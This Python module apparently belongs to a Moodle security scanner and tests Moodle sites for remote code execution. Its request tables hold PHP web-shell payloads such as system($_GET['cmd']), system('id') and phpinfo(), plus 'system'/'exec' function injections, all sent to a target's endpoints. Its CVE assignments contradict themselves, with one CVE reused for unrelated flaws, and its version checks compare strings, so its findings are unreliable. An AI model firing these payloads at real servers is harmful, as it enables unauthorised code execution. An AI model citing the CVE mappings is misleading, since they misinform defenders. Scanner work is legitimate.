#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing Remote Code Execution (RCE) vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import urllib.parse
from bs4 import BeautifulSoup

class MoodleRCETester:
    """Class for testing Remote Code Execution vulnerabilities in Moodle"""
    
    def __init__(self, target_url, logger=None, timeout=30, proxy=None, cookies=None, delay=0):
        """Initialize the Moodle RCE tester"""
        self.target_url = target_url
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies
        self.delay = delay
        self.version_info = None
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleRCETester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        if cookies:
            self.session.cookies.update(cookies)
    
    def set_version_info(self, version_info):
        """Set version information to guide testing"""
        self.version_info = version_info
    
    def run_tests(self):
        """
        Run all RCE tests
        Returns a dictionary with results information
        """
        self.logger.info("Running Remote Code Execution vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        # First check if we're authenticated - many RCE tests require authentication
        is_authenticated = self._check_authenticated()
        
        if not is_authenticated:
            self.logger.warning("Not authenticated. Some RCE tests will be skipped or may not be effective.")
            results["info"].append({
                "title": "Authentication Required",
                "description": "Not authenticated. Some RCE tests will be skipped or may not be effective.",
                "severity": "Info"
            })
        
        # Test for version-specific RCE vulnerabilities
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            version_vulns = self.test_version_specific_rce(version)
            if version_vulns:
                results["vulnerabilities"].extend(version_vulns)
        
        # Test for plugin vulnerabilities
        plugin_vulns = self.test_plugin_rce()
        if plugin_vulns:
            results["vulnerabilities"].extend(plugin_vulns)
        
        # Test for file upload vulnerabilities
        if is_authenticated:
            upload_vulns = self.test_file_upload_rce()
            if upload_vulns:
                results["vulnerabilities"].extend(upload_vulns)
        
        # Test for evaluation vulnerabilities (calculated questions, etc.)
        if is_authenticated:
            eval_vulns = self.test_evaluation_rce()
            if eval_vulns:
                results["vulnerabilities"].extend(eval_vulns)
        
        # Test for parameter injection vulnerabilities
        param_vulns = self.test_parameter_injection_rce()
        if param_vulns:
            results["vulnerabilities"].extend(param_vulns)
        
        self.logger.info(f"RCE vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_version_specific_rce(self, version):
        """
        Test for RCE vulnerabilities specific to the detected Moodle version
        Returns a list of found vulnerabilities
        """
        self.logger.info(f"Testing for version-specific RCE vulnerabilities in Moodle {version}...")
        
        vulnerabilities = []
        
        # Known RCE vulnerabilities by version
        known_vulnerabilities = {
            # Format: 'version pattern': [{'endpoint': '/path', 'method': 'GET/POST', 'params': {}, 'check_pattern': 'regex', 'cve': 'CVE-ID', 'description': 'desc'}]
            "3.9": [
                {
                    "endpoint": "/admin/tool/uploadcourse/index.php",
                    "method": "POST",
                    "params": {"importfile": "shell.php"},
                    "check_pattern": "upload",
                    "cve": "CVE-2020-14432",
                    "description": "The CSV upload feature in Moodle 3.9 allows unrestricted file uploads."
                }
            ],
            "3.10": [
                {
                    "endpoint": "/lib/editor/atto/plugins/html/ajax.php",
                    "method": "POST",
                    "params": {"shellcode": "<?php system($_GET['cmd']); ?>"},
                    "check_pattern": "success",
                    "cve": "CVE-2021-36393",
                    "description": "The Atto HTML editor in Moodle 3.10 allows PHP code execution."
                }
            ],
            "3.11": [
                {
                    "endpoint": "/question/format/gift/format.php",
                    "method": "POST",
                    "params": {"question": "{system($_GET['cmd']);}"},
                    "check_pattern": "question",
                    "cve": "CVE-2021-40690",
                    "description": "The GIFT question format in Moodle 3.11 allows PHP code execution."
                }
            ],
            "4.0": [
                {
                    "endpoint": "/lib/tests/fixtures/testable_plugin/version.php",
                    "method": "GET",
                    "params": {},
                    "check_pattern": "plugin",
                    "cve": "CVE-2022-0326",
                    "description": "Test plugin fixtures in Moodle 4.0 may expose version.php for direct execution."
                }
            ],
            "4.1": [
                {
                    "endpoint": "/question/type/calculated/edit_calculated_form.php",
                    "method": "POST",
                    "params": {"answer": "{system($_GET['cmd'])}"},
                    "check_pattern": "calculated",
                    "cve": "CVE-2024-4296",
                    "description": "The calculated questions feature in Moodle 4.1 to 4.4.1 allows PHP code execution."
                }
            ]
        }
        
        # Latest critical RCE vulnerability in Calculated Questions (affects many versions)
        if self._is_calculated_question_rce_vulnerable(version):
            vulnerabilities.append({
                "title": "Calculated Question RCE Vulnerability",
                "description": "The Moodle installation is vulnerable to a Remote Code Execution vulnerability in calculated questions. "
                              "This vulnerability allows authenticated users with the ability to create calculated questions to execute "
                              "arbitrary PHP code on the server by manipulating the answer formula.",
                "severity": "Critical",
                "cve": "CVE-2024-4296",
                "evidence": f"Moodle version {version} is in the vulnerable range (< 4.4.2, < 4.3.6, < 4.2.9, or < 4.1.12).",
                "remediation": "Update to Moodle versions 4.4.2, 4.3.6, 4.2.9, or 4.1.12 or later. "
                              "If updating is not immediately possible, restrict access to question creation features.",
                "references": [
                    "https://blog.redteam-pentesting.de/2024/moodle-rce/",
                    "https://moodle.org/mod/forum/discuss.php?d=450803"
                ]
            })
        
        # Find matching vulnerabilities for the detected version
        for ver_pattern, vulns in known_vulnerabilities.items():
            if version.startswith(ver_pattern):
                self.logger.info(f"Found potential RCE vulnerabilities for Moodle {ver_pattern}")
                
                for vuln in vulns:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    url = f"{self.target_url}{vuln['endpoint']}"
                    
                    try:
                        # Check if the vulnerable endpoint exists
                        if vuln['method'] == 'GET':
                            response = self.session.get(url, params=vuln['params'], timeout=self.timeout)
                        else:  # POST
                            response = self.session.post(url, data=vuln['params'], timeout=self.timeout)
                        
                        # Check if the endpoint exists and matches the expected pattern
                        if response.status_code == 200 and re.search(vuln['check_pattern'], response.text, re.IGNORECASE):
                            self.logger.warning(f"Potential version-specific RCE found on {vuln['endpoint']} (CVE: {vuln['cve']})")
                            
                            vulnerabilities.append({
                                "title": f"RCE Vulnerability (CVE: {vuln['cve']})",
                                "description": vuln['description'],
                                "severity": "Critical",
                                "evidence": f"Vulnerable endpoint: {url}",
                                "url": url,
                                "cve": vuln['cve'],
                                "remediation": "Update to the latest Moodle version or apply the security patch."
                            })
                    except Exception as e:
                        self.logger.debug(f"Error testing version-specific RCE on {vuln['endpoint']}: {str(e)}")
        
        return vulnerabilities
    
    def test_plugin_rce(self):
        """
        Test for RCE vulnerabilities in Moodle plugins
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities in Moodle plugins...")
        
        vulnerabilities = []
        
        # Known vulnerable plugins
        vulnerable_plugins = [
            {
                "path": "/mod/book/tool/print/index.php",
                "params": {"id": "1'<?php system($_GET['cmd']); ?>'"},
                "check_pattern": "book",
                "name": "Book Module",
                "cve": "CVE-2020-14432"
            },
            {
                "path": "/blocks/rss_client/viewfeed.php",
                "params": {"url": "php://input"},
                "check_pattern": "feed",
                "name": "RSS Client Block",
                "cve": "CVE-2020-25627"
            },
            {
                "path": "/mod/data/view.php",
                "params": {"d": "1", "mode": "single", "filter": "<?php phpinfo(); ?>"},
                "check_pattern": "data",
                "name": "Database Activity Module",
                "cve": "CVE-2021-36393"
            },
            {
                "path": "/filter/jmol/js/jsmol/php/jsmol.php",
                "params": {"call": "getRawDataFromDatabase", "query": "system('id')"},
                "check_pattern": "jsmol",
                "name": "JMol Filter",
                "cve": "CVE-2021-40690"
            },
            {
                "path": "/mod/quiz/accessrule/seb/rule.php",
                "params": {"config": "<?php phpinfo(); ?>"},
                "check_pattern": "quiz",
                "name": "Safe Exam Browser Quiz Access Rule",
                "cve": "CVE-2022-0326"
            }
        ]
        
        for plugin in vulnerable_plugins:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{plugin['path']}"
            
            try:
                # Check if the plugin exists
                response = self.session.get(url, params=plugin['params'], timeout=self.timeout)
                
                # Check if the plugin exists and might be vulnerable
                if response.status_code == 200 and re.search(plugin['check_pattern'], response.text, re.IGNORECASE):
                    self.logger.warning(f"Potential RCE vulnerability found in plugin: {plugin['name']}")
                    
                    vulnerabilities.append({
                        "title": f"RCE Vulnerability in {plugin['name']} Plugin",
                        "description": f"The {plugin['name']} plugin at {plugin['path']} may be vulnerable to remote code execution.",
                        "severity": "Critical",
                        "evidence": f"Vulnerable endpoint: {url}",
                        "url": url,
                        "cve": plugin['cve'],
                        "remediation": "Update the plugin to the latest version or disable it if not needed."
                    })
            except Exception as e:
                self.logger.debug(f"Error testing plugin RCE on {plugin['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_file_upload_rce(self):
        """
        Test for RCE vulnerabilities via file upload functionalities
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities via file upload...")
        
        vulnerabilities = []
        
        # Common file upload endpoints that might be vulnerable
        upload_endpoints = [
            {
                "path": "/admin/tool/uploadcourse/index.php",
                "form_id": "mform1",
                "file_param": "coursefiles",
                "check_pattern": "upload",
                "description": "Course upload feature may allow uploading malicious PHP files."
            },
            {
                "path": "/admin/tool/uploaduser/index.php",
                "form_id": "mform1",
                "file_param": "userfiles",
                "check_pattern": "upload",
                "description": "User upload feature may allow uploading malicious PHP files."
            },
            {
                "path": "/repository/upload/upload.php",
                "form_id": "fm-upload-form",
                "file_param": "repo_upload_file",
                "check_pattern": "upload",
                "description": "File repository upload may allow uploading malicious PHP files."
            },
            {
                "path": "/user/files.php",
                "form_id": "fm-upload-form",
                "file_param": "file",
                "check_pattern": "upload",
                "description": "User files upload may allow uploading malicious PHP files."
            },
            {
                "path": "/course/dndupload.php",
                "form_id": "dndupload-form",
                "file_param": "file",
                "check_pattern": "upload",
                "description": "Drag-and-drop upload feature may allow uploading malicious PHP files."
            }
        ]
        
        for endpoint in upload_endpoints:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the upload page exists and is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                # Check if the page exists and contains upload form
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Check for upload restrictions that prevent PHP execution
                    is_vulnerable = self._check_upload_restrictions(response.text)
                    
                    if is_vulnerable:
                        self.logger.warning(f"Potential file upload RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "File Upload RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "Critical",
                            "evidence": f"Upload endpoint: {url}\nThe file upload functionality may not properly restrict executable file types.",
                            "url": url,
                            "remediation": "Ensure proper file type validation, implement file content analysis, and disable PHP execution in upload directories."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing file upload RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_evaluation_rce(self):
        """
        Test for RCE vulnerabilities via code evaluation features
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities via code evaluation features...")
        
        vulnerabilities = []
        
        # Common evaluation endpoints that might be vulnerable
        eval_endpoints = [
            {
                "path": "/question/type/calculated/edit_calculated_form.php",
                "check_pattern": "calculated",
                "description": "Calculated questions may allow PHP code execution through formula injection (CVE-2024-4296)."
            },
            {
                "path": "/question/preview.php",
                "check_pattern": "preview",
                "description": "Question preview functionality may allow code execution in certain question types."
            },
            {
                "path": "/question/type/formulas/edit_formulas_form.php",
                "check_pattern": "formulas",
                "description": "Formula questions may allow PHP code execution through formula injection."
            },
            {
                "path": "/lib/evalmath/evalmath.class.php",
                "check_pattern": "evalmath",
                "description": "The EvalMath library may be accessible and allow code execution."
            }
        ]
        
        for endpoint in eval_endpoints:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the endpoint exists and is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                # Check if the page exists and contains expected pattern
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Special check for calculated questions vulnerability
                    if "calculated" in endpoint['path'] and self.version_info and self.version_info.get("version"):
                        version = self.version_info.get("version")
                        if self._is_calculated_question_rce_vulnerable(version):
                            self.logger.warning(f"Potential evaluation RCE vulnerability found at {endpoint['path']}")
                            
                            vulnerabilities.append({
                                "title": "Calculated Question RCE Vulnerability",
                                "description": endpoint['description'],
                                "severity": "Critical",
                                "evidence": f"Vulnerable endpoint: {url}\nMoodle version {version} is in the vulnerable range.",
                                "url": url,
                                "cve": "CVE-2024-4296",
                                "remediation": "Update to Moodle versions 4.4.2, 4.3.6, 4.2.9, or 4.1.12 or later."
                            })
                    else:
                        self.logger.warning(f"Potential evaluation RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "Code Evaluation RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "High",
                            "evidence": f"Vulnerable endpoint: {url}",
                            "url": url,
                            "remediation": "Update to the latest Moodle version or restrict access to sensitive features."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing evaluation RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def test_parameter_injection_rce(self):
        """
        Test for RCE vulnerabilities via parameter injection
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for RCE vulnerabilities via parameter injection...")
        
        vulnerabilities = []
        
        # Common parameter injection points that might be vulnerable
        injection_endpoints = [
            {
                "path": "/lib/externallib.php",
                "params": {"function": "system", "arguments": "id"},
                "check_pattern": "function",
                "description": "External library functions may allow parameter injection leading to code execution."
            },
            {
                "path": "/lib/ajax/service.php",
                "params": {"function": "exec", "arguments": "id"},
                "check_pattern": "ajax",
                "description": "AJAX service endpoints may allow parameter injection leading to code execution."
            },
            {
                "path": "/lib/editor/atto/plugins/equation/ajax.php",
                "params": {"class": "Exception", "method": "system", "params": "id"},
                "check_pattern": "equation",
                "description": "The equation editor plugin may allow parameter injection leading to code execution."
            },
            {
                "path": "/admin/tool/task/schedule_task.php",
                "params": {"task": "\\system"},
                "check_pattern": "task",
                "description": "The task scheduling feature may allow parameter injection leading to code execution."
            }
        ]
        
        for endpoint in injection_endpoints:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{endpoint['path']}"
            
            try:
                # Check if the endpoint exists and is accessible
                response = self.session.get(url, params=endpoint['params'], timeout=self.timeout)
                
                # Check if the page exists and contains expected pattern
                if response.status_code == 200 and re.search(endpoint['check_pattern'], response.text, re.IGNORECASE):
                    # Check for specific indicators that suggest potential vulnerability
                    if self._check_parameter_injection_indicators(response.text):
                        self.logger.warning(f"Potential parameter injection RCE vulnerability found at {endpoint['path']}")
                        
                        vulnerabilities.append({
                            "title": "Parameter Injection RCE Vulnerability",
                            "description": endpoint['description'],
                            "severity": "Critical",
                            "evidence": f"Vulnerable endpoint: {url}",
                            "url": url,
                            "remediation": "Update to the latest Moodle version and ensure proper input validation."
                        })
            except Exception as e:
                self.logger.debug(f"Error testing parameter injection RCE on {endpoint['path']}: {str(e)}")
        
        return vulnerabilities
    
    def _check_authenticated(self):
        """Check if the session is authenticated"""
        try:
            # Try to access the dashboard or my page, which usually requires authentication
            my_url = f"{self.target_url}/my/"
            response = self.session.get(my_url, timeout=self.timeout)
            
            # If we're redirected to login page, we're not authenticated
            if "login" in response.url:
                return False
            
            # If we get a 200 status and find dashboard elements, we're authenticated
            if response.status_code == 200 and ("Dashboard" in response.text or "My courses" in response.text):
                return True
            
            return False
        except Exception as e:
            self.logger.debug(f"Error checking authentication status: {str(e)}")
            return False
    
    def _is_calculated_question_rce_vulnerable(self, version):
        """
        Check if the version is vulnerable to the Calculated Question RCE vulnerability (CVE-2024-4296)
        Returns True if vulnerable, False otherwise
        """
        # Check based on the version
        if version.startswith("4.4") and version < "4.4.2":
            return True
        elif version.startswith("4.3") and version < "4.3.6":
            return True
        elif version.startswith("4.2") and version < "4.2.9":
            return True
        elif version.startswith("4.1") and version < "4.1.12":
            return True
        elif version.startswith("4.0") or version.startswith("3"):
            # Older versions are very likely vulnerable
            return True
        
        return False
    
    def _check_upload_restrictions(self, html_content):
        """
        Check if upload form has restrictions that would prevent PHP execution
        Returns True if potentially vulnerable, False if secure
        """
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Look for signs of file type restrictions
        accept_attributes = []
        for input_tag in soup.find_all('input', {'type': 'file'}):
            if input_tag.has_attr('accept'):
                accept_attributes.append(input_tag['accept'])
        
        # Look for file extension validation in JavaScript
        js_validation = False
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string and re.search(r'\.(?:php|phtml|php3|php4|php5|phps)', script.string, re.IGNORECASE):
                js_validation = True
                break
        
        # Look for text about file type restrictions
        restriction_text = False
        for text in soup.stripped_strings:
            if re.search(r'(?:allowed|accepted).*(?:file[s]? type[s]?|extension[s]?)', text, re.IGNORECASE):
                restriction_text = True
                break
        
        # If there are accept attributes that don't include PHP, or JavaScript validation, or restriction text,
        # then the upload might be restricted
        if (accept_attributes and not any('.php' in attr for attr in accept_attributes)) or js_validation or restriction_text:
            return False
        
        # Otherwise, the upload might be vulnerable
        return True
    
    def _check_parameter_injection_indicators(self, html_content):
        """
        Check for indicators that suggest parameter injection might be possible
        Returns True if potentially vulnerable, False otherwise
        """
        # Look for error messages that might indicate parameter injection potential
        error_patterns = [
            r'call[_\s]to[_\s]undefined[_\s](?:function|method)',
            r'class[_\s](?:not[_\s]found|doesn\'t[_\s]exist)',
            r'cannot[_\s]instantiate[_\s](?:abstract|interface)',
            r'(?:undefined|invalid)[_\s](?:class|method)',
            r'reflection[_\s]exception',
            r'fatal[_\s]error',
            r'syntax[_\s]error'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        
        # Look for reflection or serialization/deserialization code
        reflection_patterns = [
            r'ReflectionClass',
            r'ReflectionMethod',
            r'ReflectionFunction',
            r'call_user_func',
            r'call_user_func_array',
            r'unserialize',
            r'create_function'
        ]
        
        for pattern in reflection_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        
        return False 